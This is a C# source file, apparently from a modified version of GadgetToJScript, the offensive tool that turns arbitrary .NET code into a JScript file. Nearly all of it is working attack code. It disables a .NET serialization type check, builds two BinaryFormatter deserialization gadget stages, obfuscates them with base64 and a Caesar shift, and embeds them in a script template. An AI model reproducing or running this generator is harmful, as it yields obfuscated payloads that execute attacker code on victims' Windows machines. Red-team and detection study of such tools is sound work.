//    GadgetToJscript.
//    Copyright (C) Elazaar / @med0x2e 2019
//
//    GadgetToJscript is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
//
//    GadgetToJscript is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with GadgetToJscript.  If not, see <http://www.gnu.org/licenses/>.
//
// 	  Based on GadgetToJscript https://github.com/med0x2e/GadgetToJScript and modified by @eksperience / @leftp

using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;

namespace GadgetToJScript
{
	class GadgetToJScript
	{
		public static string CaesarShift(string inputString, int shiftPattern)
        {
            StringBuilder sb = new StringBuilder();
            foreach (char letter in inputString)
            {
                int encryptedValue = 0;
                if ((letter) >= 65 && (letter) <=90) 
                {
                    encryptedValue = (((letter - 'A') + shiftPattern) % 26) + 'A';
                }
                else if (letter < 65 || letter >= 123)
                {
                    encryptedValue = letter;
                }
                else
                {
                    encryptedValue = (((letter - 'a') + shiftPattern) % 26) + 'a';
                }

                sb.Append((char)encryptedValue);
            }
            return sb.ToString();
        }

		static void Main()
		{
			string source;
			string template;

			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SourceCode"))
			{
				using (StreamReader sr = new StreamReader(stream))
				{
					source = sr.ReadToEnd();
				}
			}

			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Template"))
			{
				using (StreamReader sr = new StreamReader(stream))
				{
					template = sr.ReadToEnd();
				}
			}

			ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
			DisableTypeCheckGadgetGenerator dtcgg = new DisableTypeCheckGadgetGenerator();
			MemoryStream stageOne = dtcgg.generateGadget(new MemoryStream());
			template = template.Replace("%STAGE_1%", CaesarShift(Convert.ToBase64String(stageOne.ToArray()),12));
			template = template.Replace("%SIZE_OF_STAGE_1%", stageOne.Length.ToString());
			Assembly assembly = InternalCompiler.compile(source);
			BinaryFormatter bf = new BinaryFormatter();
			MemoryStream stageTwo = new MemoryStream();
			SurrogateGadgetGenerator sgg = new SurrogateGadgetGenerator(assembly);
			bf.Serialize(stageTwo, sgg);
			template = template.Replace("%STAGE_2%", CaesarShift(Convert.ToBase64String(stageTwo.ToArray()),12));
			template = template.Replace("%SIZE_OF_STAGE_2%", stageTwo.Length.ToString());
			File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), Process.GetCurrentProcess().ProcessName + ".js"), template);
		}
	}
}
